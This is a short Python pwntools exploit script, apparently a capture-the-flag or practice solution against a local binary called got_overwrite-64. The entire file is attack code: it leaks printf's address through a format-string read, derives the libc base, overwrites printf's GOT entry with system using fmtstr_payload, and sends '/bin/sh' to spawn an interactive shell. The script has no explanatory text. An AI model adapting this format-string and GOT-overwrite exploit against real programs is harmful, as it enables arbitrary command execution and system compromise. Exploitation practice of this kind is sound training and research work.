#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('./got_overwrite-64')
libc = elf.libc

p = process()

payload = flat(
    b'%7$s||||',
    elf.got['printf']
)
p.sendline(payload)

printf_leak = u64(p.recv(6) + b'\x00\x00')

libc.address = printf_leak - libc.sym['printf']

printf_got = elf.got['printf']
system = libc.sym['system']

payload = fmtstr_payload(6, { printf_got : system })

p.sendline(payload)

p.clean()

p.sendline(b'/bin/sh')

p.interactive()
